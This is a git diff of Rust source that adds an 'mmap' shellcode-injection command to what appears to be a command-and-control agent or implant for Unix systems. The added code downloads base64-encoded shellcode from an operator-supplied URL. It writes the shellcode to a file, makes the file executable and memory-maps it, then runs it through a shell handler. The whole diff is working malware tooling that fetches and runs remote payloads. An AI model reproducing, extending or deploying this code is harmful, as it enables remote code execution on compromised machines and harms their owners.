@@ -280,10 +280,68 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
 
 #[cfg(not(windows))]
 pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
-
+    
     if let Some(inject_type) = cmd_args.nth(0) {
+
+        // Set up our variables; each one could fail on us.
+        // Yes this is a lot of verbose error checking, but this
+        // has to be rock solid or the agent will die.
+        let mut url: String;
+        let mut b64_iterations: u32;
+
         match inject_type.as_str() {
             "mmap" => {
+                use std::fs::OpenOptions;
+                use std::os::unix::fs::PermissionsExt;
+                use crate::cmd::shell;
+                
+                // Get URL
+                match cmd_args.nth(0) {
+                    Some(u) => { 
+                        logger.debug(format!("Shellcode URL: {}", &u));
+                        url = u; 
+                    },
+                    None    => { return Ok("Could not parse URL".to_string()); }
+                };
+
+                // Get b64_iterations
+                match cmd_args.nth(0) {
+                    Some(bs) => {
+                        if let Ok(b) = bs.parse::<u32>() {
+                            b64_iterations = b;
+                        } else {
+                            return Ok("Could not parse b64 iterations".to_string());
+                        }
+                    },
+                    None => { return Ok("Could not extract b64 iterations".to_string()); }
+                };
+                
+                // Get shellcode
+                let mut shellcode: Vec<u8>; 
+                match get_shellcode(url, b64_iterations, logger).await {
+                    Ok(s) => { shellcode = s},
+                    Err(e) => { return Ok(e.to_string()); }
+                };
+
+
+                let file_name = "blargh";
+                let file = OpenOptions::new()
+                    .read(true)
+                    .write(true)
+                    .create(true)
+                    .open(file_name)?;
+
+                
+                file.set_permissions(PermissionsExt::from_mode(0o755))?;
+                file.set_len(shellcode.len().try_into().unwrap())?;
+
+                let mut mmap = unsafe { MmapMut::map_mut(&file)? };
+                mmap.copy_from_slice(shellcode.as_slice());
+                mmap.make_exec()?;
+                
+                let mut shell_arg = CommandArgs::from_string(file_name.to_string());
+                shell::handle(&mut shell_arg).await?;
+                
                 return Ok("MMMMap".to_string());
             },
             _ => { return Ok("Unknown injection method!".to_string()) ;}
